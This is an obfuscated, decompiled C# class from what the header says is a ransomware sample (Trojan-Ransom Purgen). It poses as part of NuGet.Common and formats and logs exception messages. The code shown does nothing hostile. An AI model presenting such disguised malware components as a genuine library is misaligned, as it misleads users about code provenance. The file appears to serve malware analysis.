// Decompiled with JetBrains decompiler
// Type: NuGet.Common.RsvtOLUsBt
// Assembly: Ty6CWyxFEL, Version=5.0.0.2, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 271E2DAF-741A-443A-8BCF-B62C509DDC38
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Purgen.gen-185fafbeb00cd8238fdabee088763e27012dd3a0076e04dddca6266f129f0430.exe

using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;

namespace NuGet.Common
{
  public static class RsvtOLUsBt
  {
    public static void rnLIktzWJA(Exception l4iweCcSvq, ILogger besrSBFjxg) => RsvtOLUsBt.ctMYBKgBnd(l4iweCcSvq, besrSBFjxg, false);

    public static void ctMYBKgBnd(Exception tUEPRYJFMZ, ILogger JzCosRWut9, bool Ixd6IRW9tf)
    {
      Exception GO1tx7SUSA = RsvtOLUsBt.QmwX3T8zEF(tUEPRYJFMZ);
      if (GO1tx7SUSA is ILogMessageException messageException)
      {
        ILogMessage message = messageException.AsLogMessage();
        JzCosRWut9.Log(message);
      }
      else
        JzCosRWut9.Log((ILogMessage) new coTQJabLMP(HVe4ZaB2Yt.Error, RsvtOLUsBt.\u0033cBRe2YGoB(GO1tx7SUSA)));
      HVe4ZaB2Yt hve4ZaB2Yt = Ixd6IRW9tf || xnYPGTeMX0.fJSUgG00YX.kfJMKmpbLC ? HVe4ZaB2Yt.Error : HVe4ZaB2Yt.Verbose;
      JzCosRWut9.Log((ILogMessage) coTQJabLMP.lq3skthx9A(hve4ZaB2Yt, GO1tx7SUSA.ToString()));
    }

    public static string YIluLPWsLO(Exception _param0, bool _param1)
    {
      switch (_param0)
      {
        case null:
          throw new ArgumentNullException("exception");
        case AggregateException aggregateException:
          return RsvtOLUsBt.ndmhhmRay9(aggregateException);
        case TargetInvocationException mNp1faqo86:
          return RsvtOLUsBt.\u0036GGPZfaUQ7(mNp1faqo86);
        default:
          return RsvtOLUsBt.\u0033mcyBJxLb7(RsvtOLUsBt.eTSDaOrN4m(_param0), _param1);
      }
    }

    public static string \u0033cBRe2YGoB(Exception GO1tx7SUSA) => RsvtOLUsBt.YIluLPWsLO(GO1tx7SUSA, true);

    public static string ndmhhmRay9(AggregateException _param0) => _param0 != null ? RsvtOLUsBt.\u0033mcyBJxLb7(RsvtOLUsBt.lrfXJpTqbf(_param0), true) : throw new ArgumentNullException("exception");

    public static string \u0036GGPZfaUQ7(TargetInvocationException mNp1faqo86) => mNp1faqo86 != null ? RsvtOLUsBt.\u0033mcyBJxLb7(RsvtOLUsBt.RHAl221rrT(mNp1faqo86), true) : throw new ArgumentNullException("exception");

    public static Exception QmwX3T8zEF(Exception _param0)
    {
      if (_param0 == null)
        throw new ArgumentNullException("exception");
      if (_param0.InnerException == null)
        return _param0;
      switch (_param0)
      {
        case AggregateException _:
        case TargetInvocationException _:
          return _param0.GetBaseException();
        default:
          return _param0;
      }
    }

    private static IEnumerable<string> lrfXJpTqbf(AggregateException fWkzgDuHqr) => (IEnumerable<string>) new RsvtOLUsBt.VN884HnJ5w(-2)
    {
      xuiUaJHZkh = fWkzgDuHqr
    };

    private static IEnumerable<string> RHAl221rrT(TargetInvocationException bcGnLOkm8W)
    {
      if (bcGnLOkm8W.InnerException != null)
        return RsvtOLUsBt.eTSDaOrN4m(bcGnLOkm8W.InnerException);
      return (IEnumerable<string>) new string[1]
      {
        bcGnLOkm8W.Message
      };
    }

    private static IEnumerable<string> eTSDaOrN4m(Exception gzI4bBgvGz) => (IEnumerable<string>) new RsvtOLUsBt.R7MtFkKbOJ(-2)
    {
      KbRgMrXdo7 = gzI4bBgvGz
    };

    private static IEnumerable<string> FVCRlSkikj(string gpmzxNrb4g) => (IEnumerable<string>) new RsvtOLUsBt.\u0031QA8oXkY08(-2)
    {
      aHhG1t46Vn = gpmzxNrb4g
    };

    private static string \u0033mcyBJxLb7(IEnumerable<string> LE1YP4fsc2, bool OqiRiumEVb)
    {
      StringBuilder stringBuilder = new StringBuilder();
      foreach (string gpmzxNrb4g in LE1YP4fsc2)
      {
        bool flag = OqiRiumEVb && stringBuilder.Length > 0;
        foreach (string str in RsvtOLUsBt.FVCRlSkikj(gpmzxNrb4g))
        {
          if (flag)
            stringBuilder.Append("  ");
          stringBuilder.AppendLine(str);
        }
      }
      return stringBuilder.ToString().TrimEnd();
    }
  }
}
